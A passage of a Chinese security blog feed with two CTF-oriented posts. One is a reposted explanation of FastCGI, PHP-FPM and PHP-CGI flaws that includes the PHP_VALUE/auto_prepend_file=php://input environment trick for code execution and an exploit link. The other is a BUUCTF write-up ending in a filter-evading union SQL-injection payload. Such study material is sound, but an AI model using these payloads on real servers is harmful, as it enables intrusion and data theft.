src="https://i.loli.net/2020/09/13/CyqHuxPzhwRSQKT.jpg"></p><p>服务器中间件和后端语言通信，第一个数据包就是<code>type</code>为1的record，后续互相交流，发送<code>type</code>为4、5、6、7的record，结束时发送<code>type</code>为2、3的record。</p><p>当后端语言接收到一个<code>type</code>为4的record后，就会把这个record的body按照对应的结构解析成key-value对，这就是环境变量。环境变量的结构如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">  unsigned char nameLengthB0;  &#x2F;* nameLengthB0  &gt;&gt; 7 &#x3D;&#x3D; 0 *&#x2F;</span><br><span class="line">  unsigned char valueLengthB0; &#x2F;* valueLengthB0 &gt;&gt; 7 &#x3D;&#x3D; 0 *&#x2F;</span><br><span class="line">  unsigned char nameData[nameLength];</span><br><span class="line">  unsigned char valueData[valueLength];</span><br><span class="line">&#125; FCGI_NameValuePair11;</span><br><span class="line"></span><br><span class="line">typedef struct &#123;</span><br><span class="line">  unsigned char nameLengthB0;  &#x2F;* nameLengthB0  &gt;&gt; 7 &#x3D;&#x3D; 0 *&#x2F;</span><br><span class="line">  unsigned char valueLengthB3; &#x2F;* valueLengthB3 &gt;&gt; 7 &#x3D;&#x3D; 1 *&#x2F;</span><br><span class="line">  unsigned char valueLengthB2;</span><br><span class="line">  unsigned char valueLengthB1;</span><br><span class="line">  unsigned char valueLengthB0;</span><br><span class="line">  unsigned char nameData[nameLength];</span><br><span class="line">  unsigned char valueData[valueLength</span><br><span class="line">          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];</span><br><span class="line">&#125; FCGI_NameValuePair14;</span><br><span class="line"></span><br><span class="line">typedef struct &#123;</span><br><span class="line">  unsigned char nameLengthB3;  &#x2F;* nameLengthB3  &gt;&gt; 7 &#x3D;&#x3D; 1 *&#x2F;</span><br><span class="line">  unsigned char nameLengthB2;</span><br><span class="line">  unsigned char nameLengthB1;</span><br><span class="line">  unsigned char nameLengthB0;</span><br><span class="line">  unsigned char valueLengthB0; &#x2F;* valueLengthB0 &gt;&gt; 7 &#x3D;&#x3D; 0 *&#x2F;</span><br><span class="line">  unsigned char nameData[nameLength</span><br><span class="line">          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];</span><br><span class="line">  unsigned char valueData[valueLength];</span><br><span class="line">&#125; FCGI_NameValuePair41;</span><br><span class="line"></span><br><span class="line">typedef struct &#123;</span><br><span class="line">  unsigned char nameLengthB3;  &#x2F;* nameLengthB3  &gt;&gt; 7 &#x3D;&#x3D; 1 *&#x2F;</span><br><span class="line">  unsigned char nameLengthB2;</span><br><span class="line">  unsigned char nameLengthB1;</span><br><span class="line">  unsigned char nameLengthB0;</span><br><span class="line">  unsigned char valueLengthB3; &#x2F;* valueLengthB3 &gt;&gt; 7 &#x3D;&#x3D; 1 *&#x2F;</span><br><span class="line">  unsigned char valueLengthB2;</span><br><span class="line">  unsigned char valueLengthB1;</span><br><span class="line">  unsigned char valueLengthB0;</span><br><span class="line">  unsigned char nameData[nameLength</span><br><span class="line">          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];</span><br><span class="line">  unsigned char valueData[valueLength</span><br><span class="line">          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];</span><br><span class="line">&#125; FCGI_NameValuePair44;</span><br></pre></td></tr></table></figure><p>这其实是4个结构，至于用哪个结构，有如下规则：</p><ol><li>key、value均小于128字节，用<code>FCGI_NameValuePair11</code></li><li>key大于128字节，value小于128字节，用<code>FCGI_NameValuePair41</code></li><li>key小于128字节，value大于128字节，用<code>FCGI_NameValuePair14</code></li><li>key、value均大于128字节，用<code>FCGI_NameValuePair44</code></li></ol><p>为什么我只介绍<code>type</code>为4的record？因为环境变量在后面PHP-FPM里有重要作用，之后写代码也会写到这个结构。<code>type</code>的其他情况，请自行百度。</p><h2 id="PHP-FPM"><a href="#PHP-FPM" class="headerlink" title="PHP-FPM"></a>PHP-FPM</h2><p>上面说到这个协议会将用户上传到数据解析成key-value的键值对的情况，但是打包好后传给谁呢？那个人就是PHP-FPM。</p><p>举个例子，用户访问<code>http://192.168.0.0.1/index.php?ace=1&amp;cve=2</code>，如果web目录是<code>/var/www/html</code>，那么Nginx会将这个请求变成如下key-value对：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#39;GATEWAY_INTERFACE&#39;: &#39;FastCGI&#x2F;1.0&#39;,</span><br><span class="line">    &#39;REQUEST_METHOD&#39;: &#39;GET&#39;,</span><br><span class="line">    &#39;SCRIPT_FILENAME&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;,</span><br><span class="line">    &#39;SCRIPT_NAME&#39;: &#39;&#x2F;index.php&#39;,</span><br><span class="line">    &#39;QUERY_STRING&#39;: &#39;?a&#x3D;1&amp;b&#x3D;2&#39;,</span><br><span class="line">    &#39;REQUEST_URI&#39;: &#39;&#x2F;index.php?ace&#x3D;1&amp;cve&#x3D;2&#39;,</span><br><span class="line">    &#39;DOCUMENT_ROOT&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#39;,</span><br><span class="line">    &#39;SERVER_SOFTWARE&#39;: &#39;php&#x2F;fcgiclient&#39;,</span><br><span class="line">    &#39;REMOTE_ADDR&#39;: &#39;127.0.0.1&#39;,</span><br><span class="line">    &#39;REMOTE_PORT&#39;: &#39;12345&#39;,</span><br><span class="line">    &#39;SERVER_ADDR&#39;: &#39;127.0.0.1&#39;,</span><br><span class="line">    &#39;SERVER_PORT&#39;: &#39;80&#39;,</span><br><span class="line">    &#39;SERVER_NAME&#39;: &quot;localhost&quot;,</span><br><span class="line">    &#39;SERVER_PROTOCOL&#39;: &#39;HTTP&#x2F;1.1&#39;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个数组其实就是PHP中<code>$_SERVER</code>数组的一部分，也就是PHP里的环境变量。但环境变量的作用不仅是填充<code>$_SERVER</code>数组，也是告诉fpm：“我要执行哪个PHP文件”。然后FPM拿到这些环境变量之后就是进行执行，去找那个PHP文件。</p><h2 id="漏洞解析"><a href="#漏洞解析" class="headerlink" title="漏洞解析"></a>漏洞解析</h2><p>这个漏洞简单的来说就是用户提供的**未加=**的数据被当作PHP-CGI的参数，最后导致了一系列的结果。这个是RFC3875中规定的，Apache服务器按要求实现了这个功能，但PHP并没有注意到RFC的这一个规则，也许是曾经注意并处理了，处理方法就是web上下文中不允许传入参数。</p><p>但是开发者是为了方便使用类似<code>#!/usr/local/bin/php-cgi -d include_path=/path</code>的写法来进行测试，认为不应该限制php-cgi接受命令行参数，而且这个功能不和其他代码有任何冲突。于是就把限制给删掉了，但是很显然，根据RFC中对于命令行的说明，参数不光能够通过上诉方法传入，还可以通过请求参数。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul><li><code>-c</code> 指定php.ini文件的位置</li><li><code>-n</code> 不要加载php.ini文件</li><li><code>-d</code> 指定配置项</li><li><code>-b</code> 启动fastcgi进程</li><li><code>-s</code> 显示文件源码</li><li><code>-T</code> 执行指定次该文件</li><li><code>-h</code>和<code>-?</code> 显示帮助</li></ul><p>这次放在源代码之后就可以进行利用，简单方便。当然继续看下去， 看见**-d**这个牛鼻的参数这个漏洞又怎么会这么简单呢？？</p><p>实际使用中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_include:远程文件包含</span><br><span class="line">&#96;auto_prepend_file&#96;：包含我们的代码</span><br></pre></td></tr></table></figure><p>我们继续解析:</p><h2 id="任意代码执行"><a href="#任意代码执行" class="headerlink" title="任意代码执行"></a>任意代码执行</h2><p>这里怎么去任意代码执行，首先有以下几个问题:</p><ul><li><p>即使我们能控制<code>SCRIPT_FILENAME</code>，让fpm执行任意文件，也只是执行目标服务器上的文件，并不能执行我们需要其执行的文件。</p></li><li><p>我们怎么把代码上传上去</p><p>PHP语言的特性就是有很多很强大的配置项<code>auto_prepend_file</code>和<code>auto_append_file</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.auto_prepend_file是告诉PHP，在执行目标文件之前，先包含auto_prepend_file中指定的文件；</span><br><span class="line">2.auto_append_file是告诉PHP，在执行完成目标文件后，包含auto_append_file指向的文件。</span><br></pre></td></tr></table></figure><p>如果我们把auto_prepend__file设置成<code>php://input</code>然后我们再执行任何的php文件前都会包含一些post的内容了，所以我们只要post一下，这些代码就都能够被执行了，（当然，还需要开启远程文件包含选项<code>allow_url_include</code>）</p></li></ul><p>这个时候就有下一个问题了，就是我们怎么设置这个环境变量的值呢？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHP_VALUE&#96;和&#96;PHP_ADMIN_VALUE</span><br><span class="line">这两个环境变量就是用来设置PHP配置项的，PHP_VALUE可以设置模式为PHP_INI_USER和PHP_INI_ALL的选项，PHP_ADMIN_VALUE可以设置所有选项。（disable_functions除外，这个选项是PHP加载的时候就确定了，在范围内的函数直接不会被加载到PHP上下文中</span><br></pre></td></tr></table></figure><p>这就是他们两个的特长了。</p><p>所以，我们最后传入如下环境变量：（直接和FPM进行通信）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#39;GATEWAY_INTERFACE&#39;: &#39;FastCGI&#x2F;1.0&#39;,</span><br><span class="line">    &#39;REQUEST_METHOD&#39;: &#39;GET&#39;,</span><br><span class="line">    &#39;SCRIPT_FILENAME&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;,</span><br><span class="line">    &#39;SCRIPT_NAME&#39;: &#39;&#x2F;index.php&#39;,</span><br><span class="line">    &#39;QUERY_STRING&#39;: &#39;?a&#x3D;1&amp;b&#x3D;2&#39;,</span><br><span class="line">    &#39;REQUEST_URI&#39;: &#39;&#x2F;index.php?a&#x3D;1&amp;b&#x3D;2&#39;,</span><br><span class="line">    &#39;DOCUMENT_ROOT&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#39;,</span><br><span class="line">    &#39;SERVER_SOFTWARE&#39;: &#39;php&#x2F;fcgiclient&#39;,</span><br><span class="line">    &#39;REMOTE_ADDR&#39;: &#39;127.0.0.1&#39;,</span><br><span class="line">    &#39;REMOTE_PORT&#39;: &#39;12345&#39;,</span><br><span class="line">    &#39;SERVER_ADDR&#39;: &#39;127.0.0.1&#39;,</span><br><span class="line">    &#39;SERVER_PORT&#39;: &#39;80&#39;,</span><br><span class="line">    &#39;SERVER_NAME&#39;: &quot;localhost&quot;,</span><br><span class="line">    &#39;SERVER_PROTOCOL&#39;: &#39;HTTP&#x2F;1.1&#39;</span><br><span class="line">    &#39;PHP_VALUE&#39;: &#39;auto_prepend_file &#x3D; php:&#x2F;&#x2F;input&#39;,</span><br><span class="line">    &#39;PHP_ADMIN_VALUE&#39;: &#39;allow_url_include &#x3D; On&#39;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Nginx（IIS7）解析漏洞（文件上传"><a href="#Nginx（IIS7）解析漏洞（文件上传" class="headerlink" title="Nginx（IIS7）解析漏洞（文件上传)"></a>Nginx（IIS7）解析漏洞（文件上传)</h2><p>Nginx和IIS7曾经出现过一个PHP相关的解析漏洞（测试环境<code>https://github.com/phith0n/vulhub/tree/master/nginx_parsing_vulnerability</code>），该漏洞现象是，在用户访问<code>http://127.0.0.1/favicon.ico/.php</code>时，访问到的文件是favicon.ico，但却按照.php后缀解析了。</p><p>用户请求<code>http://127.0.0.1/favicon.ico/.php</code>，nginx将会发送如下环境变量到fpm里：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    &#39;SCRIPT_FILENAME&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;favicon.ico&#x2F;.php&#39;,</span><br><span class="line">    &#39;SCRIPT_NAME&#39;: &#39;&#x2F;favicon.ico&#x2F;.php&#39;,</span><br><span class="line">    &#39;REQUEST_URI&#39;: &#39;&#x2F;favicon.ico&#x2F;.php&#39;,</span><br><span class="line">    &#39;DOCUMENT_ROOT&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#39;,</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正常来说，<code>SCRIPT_FILENAME</code>的值是一个不存在的文件<code>/var/www/html/favicon.ico/.php</code>，是PHP设置中的一个选项<code>fix_pathinfo</code>导致了这个漏洞。PHP为了支持Path Info模式而创造了<code>fix_pathinfo</code>，在这个选项被打开的情况下，fpm会判断<code>SCRIPT_FILENAME</code>是否存在，如果不存在则去掉最后一个<code>/</code>及以后的所有内容，再次判断文件是否存在，往次循环，直到文件存在。</p><p>所以，第一次fpm发现<code>/var/www/html/favicon.ico/.php</code>不存在，则去掉<code>/.php</code>，再判断<code>/var/www/html/favicon.ico</code>是否存在。显然这个文件是存在的，于是被作为PHP文件执行，导致解析漏洞。</p><p>正确的解决方法有两种，一是在Nginx端使用<code>fastcgi_split_path_info</code>将path info信息去除后，用tryfiles判断文件是否存在；二是借助PHP-FPM的<code>security.limit_extensions</code>配置项，避免其他后缀文件被解析</p><h2 id="security-limit-extensions配置"><a href="#security-limit-extensions配置" class="headerlink" title="security.limit_extensions配置"></a><code>security.limit_extensions</code>配置</h2><p>写到这里，PHP-FPM未授权访问漏洞也就呼之欲出了。PHP-FPM默认监听9000端口，如果这个端口暴露在公网，则我们可以自己构造fastcgi协议，和fpm进行通信。</p><p>此时，<code>SCRIPT_FILENAME</code>的值就格外重要了。因为fpm是根据这个值来执行php文件的，如果这个文件不存在，fpm会直接返回404：</p><p><a href="https://www.leavesongs.com/media/attachment/2017/04/25/703367c4-af98-4702-85f0-794b30776a4f.jpg"><img src="https://www.leavesongs.com/media/attachment/2017/04/25/703367c4-af98-4702-85f0-794b30776a4f.073e567856db.jpg" alt="14931285844835.jpg"></a></p><p>在fpm某个版本之前，我们可以将<code>SCRIPT_FILENAME</code>的值指定为任意后缀文件，比如<code>/etc/passwd</code>；但后来，fpm的默认配置中增加了一个选项<code>security.limit_extensions</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">; Limits the extensions of the main script FPM will allow to parse. This can</span><br><span class="line">; prevent configuration mistakes on the web server side. You should only limit</span><br><span class="line">; FPM to .php extensions to prevent malicious users to use other extensions to</span><br><span class="line">; exectute php code.</span><br><span class="line">; Note: set an empty value to allow all extensions.</span><br><span class="line">; Default Value: .php</span><br><span class="line">;security.limit_extensions &#x3D; .php .php3 .php4 .php5 .php7</span><br></pre></td></tr></table></figure><p>其限定了只有某些后缀的文件允许被fpm执行，默认是<code>.php</code>。所以，当我们再传入<code>/etc/passwd</code>的时候，将会返回<code>Access denied.</code>：</p><p><a href="https://www.leavesongs.com/media/attachment/2017/04/25/99d10f40-7dc3-46f3-a0bb-dae71e9d550b.jpg"><img src="https://www.leavesongs.com/media/attachment/2017/04/25/99d10f40-7dc3-46f3-a0bb-dae71e9d550b.30fa707133a3.jpg" alt="14931290357686.jpg"></a></p><blockquote><p>ps. 这个配置也会影响Nginx解析漏洞，我觉得应该是因为Nginx当时那个解析漏洞，促成PHP-FPM增加了这个安全选项。另外，也有少部分发行版安装中<code>security.limit_extensions</code>默认为空，此时就没有任何限制了。</p></blockquote><p>由于这个配置项的限制，如果想利用PHP-FPM的未授权访问漏洞，首先就得找到一个已存在的PHP文件。</p><p>万幸的是，通常使用源安装php的时候，服务器上都会附带一些php后缀的文件，我们使用<code>find / -name &quot;*.php&quot;</code>来全局搜索一下默认环境：</p><p><a href="https://www.leavesongs.com/media/attachment/2017/04/25/15695b8e-79ae-4f32-b061-cc5f52236e18.jpg"><img src="https://www.leavesongs.com/media/attachment/2017/04/25/15695b8e-79ae-4f32-b061-cc5f52236e18.a5365d20818a.jpg" alt="14931297810961.jpg"></a></p><p>找到了不少。这就给我们提供了一条思路，假设我们爆破不出来目标环境的web目录，我们可以找找默认源安装后可能存在的php文件，比如<code>/usr/local/lib/php/PEAR.php</code>。</p><p>exp:：<a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a> </p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;lt-转载-gt-PHP-CGI远程代码执行漏洞&quot;&gt;&lt;a href=&quot;#lt-转载-gt-PHP-CGI远程代码执行漏洞&quot; class=&quot;headerlink&quot; title=&quot;&amp;lt;转载&amp;gt;PHP-CGI远程代码执行漏洞&quot;&gt;&lt;/a&gt;&amp;lt;转载&amp;gt;PHP-CGI远程代码执行漏洞&lt;/h1&gt;&lt;h2 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h2&gt;&lt;p&gt;影响的:php &amp;lt; 5.3.12 or php &amp;lt; 5.4.2&lt;/p&gt;
&lt;p&gt;转载链接：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://baijiahao.baidu.com/s?id=1637483210158521104&amp;amp;wfr=spider&amp;amp;for=pc1&quot;&gt;https://baijiahao.baidu.com/s?id=1637483210158521104&amp;amp;wfr=spider&amp;amp;for=pc1&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html&quot;&gt;Fastcgi协议分析 &amp;amp;&amp;amp; PHP-FPM未授权访问漏洞 &amp;amp;&amp;amp; Exp编写&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;漏洞解读&quot;&gt;&lt;a href=&quot;#漏洞解读&quot; class=&quot;headerlink&quot; title=&quot;漏洞解读&quot;&gt;&lt;/a&gt;漏洞解读&lt;/h2&gt;&lt;h3 id=&quot;CGi-协议&quot;&gt;&lt;a href=&quot;#CGi-协议&quot; class=&quot;headerlink&quot; title=&quot;CGi 协议&quot;&gt;&lt;/a&gt;CGi 协议&lt;/h3&gt;&lt;p&gt;CGI是一种网页表单和程序之间通信的一种协议，和HTTP协议一样，用于进行数据交换。可以用任何语言来写一个CGI脚本，这些语言只要能接受输入输出信息，读取环境变量。&lt;/p&gt;
&lt;p&gt;php-cgi也是一个sapi。在远古的时候，web应用的运行方式很简单，web容器接收到http数据包后，拿到用户请求的文件（cgi脚本），并fork出一个子进程（解释器）去执行这个文件，然后拿到执行结果，直接返回给用户，同时这个解释器子进程也就结束了。基于bash、perl等语言的web应用多半都是以这种方式来执行，这种执行方式一般就被称为cgi&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="CVE" scheme="http://example.com/categories/CTF/CVE/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="CVE" scheme="http://example.com/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>SWPU2019-Web1</title>
    <link href="http://example.com/2020/09/13/SWPU2019-Web1/"/>
    <id>http://example.com/2020/09/13/SWPU2019-Web1/</id>
    <published>2020-09-13T02:22:57.000Z</published>
    <updated>2020-09-13T03:24:43.937Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Buu刷题记"><a href="#Buu刷题记" class="headerlink" title="Buu刷题记"></a>Buu刷题记</h1><h2 id="一、题目打开介绍"><a href="#一、题目打开介绍" class="headerlink" title="一、题目打开介绍"></a>一、题目打开介绍</h2><p><img src="https://i.loli.net/2020/09/13/7cQB8umN1sZLyOp.png" alt="image-20200913095530231.png">这是题目本身打开的样子，继续进入题目</p><h2 id="二、做题"><a href="#二、做题" class="headerlink" title="二、做题"></a>二、做题</h2><p><img src="https://i.loli.net/2020/09/13/YHLftTQmUd1besK.png" alt="image-20200913095634097.png"></p><p>简单的登陆界面和注册界面，没有sql注入<strong>已经尝试</strong></p><a id="more"></a><p><img src="https://i.loli.net/2020/09/13/cfFtN41xLoAQEjO.png" alt="image-20200913095733239.png"></p><p>申请发布广告</p><p><img src="https://i.loli.net/2020/09/13/sOEZrzKgn2LqU5t.png" alt="image-20200913095759770.png"></p><p>习惯性的测试</p><p><img src="https://i.loli.net/2020/09/13/vDZlT7YSPexgVrJ.png" alt="image-20200913095857022.png"></p><p>然后开始尝试注入，抓包，</p><p><img src="https://i.loli.net/2020/09/13/RjvFaOTiMcZuBgG.png" alt="image-20200913095931186.png"><br><img src="https://i.loli.net/2020/09/13/eZLKpvNyosAEJnP.png" alt="image-20200913095944857.png"></p><p>两个都要，经过union注入判断列数，发现是22列</p><p>然后收集信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">database() web1</span><br><span class="line">version() 10.2.26-MariaDB-log</span><br></pre></td></tr></table></figure><p>然后开始使用<strong>information</strong>库进行爆表，爆字段<br><img src="https://i.loli.net/2020/09/13/6fwnvVYWotsuXDS.png" alt="image-20200913100124933.png"></p><p>然后没有用，再加上一下字符被毁掉</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and or updatexml 空格</span><br></pre></td></tr></table></figure><p>用/**/代替空格，然后继续解决无法爆出表的问题</p><p>经过百度发现还有一个表可以爆出表名</p><p><a href="https://mariadb.com/kb/en/mysqlinnodb_index_stats/">https://mariadb.com/kb/en/mysqlinnodb_index_stats/</a></p><p>就是上面这个库，然后开始继续操作就行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tables() FLAG_TABLE,news,users,gtid_slave_pos,ads,users</span><br></pre></td></tr></table></figure><p>这就是已经取得的数据。</p><p>下面解决无法爆字段的问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users</span><br></pre></td></tr></table></figure><p>如果直接使用这个命令的·话，他会返回多条数据然后并且报错，并且我们现在无法知道字段名，必须再想其他的办法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3 union select * from users</span><br></pre></td></tr></table></figure><p>这样就可以造出临时表，字段名分别可以知道了<strong>需要猜一下字段数</strong></p><p>最后 payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title&#x3D;-1&#39;and&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(b)from(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;&amp;content&#x3D;a&amp;ac&#x3D;add</span><br></pre></td></tr></table></figure><p>这里有两个注意的点</p><h3 id="1-临时表再次使用时必须要有一个别名"><a href="#1-临时表再次使用时必须要有一个别名" class="headerlink" title="1.临时表再次使用时必须要有一个别名"></a>1.临时表再次使用时必须要有一个别名</h3><h3 id="2-记得带括号"><a href="#2-记得带括号" class="headerlink" title="2.记得带括号"></a>2.记得带括号</h3><h3 id="3-数字不能做字段名"><a href="#3-数字不能做字段名" class="headerlink" title="3.数字不能做字段名"></a>3.数字不能做字段名</h3>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Buu刷题记&quot;&gt;&lt;a href=&quot;#Buu刷题记&quot; class=&quot;headerlink&quot; title=&quot;Buu刷题记&quot;&gt;&lt;/a&gt;Buu刷题记&lt;/h1&gt;&lt;h2 id=&quot;一、题目打开介绍&quot;&gt;&lt;a href=&quot;#一、题目打开介绍&quot; class=&quot;headerlink&quot; title=&quot;一、题目打开介绍&quot;&gt;&lt;/a&gt;一、题目打开介绍&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/09/13/7cQB8umN1sZLyOp.png&quot; alt=&quot;image-20200913095530231.png&quot;&gt;这是题目本身打开的样子，继续进入题目&lt;/p&gt;
&lt;h2 id=&quot;二、做题&quot;&gt;&lt;a href=&quot;#二、做题&quot; class=&quot;headerlink&quot; title=&quot;二、做题&quot;&gt;&lt;/a&gt;二、做题&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/09/13/YHLftTQmUd1besK.png&quot; alt=&quot;image-20200913095634097.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;简单的登陆界面和注册界面，没有sql注入&lt;strong&gt;已经尝试&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="BUU" scheme="http://example.com/categories/CTF/BUU/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="BUU" scheme="http://example.com/tags/BUU/"/>
    
  </entry>
  
</feed>
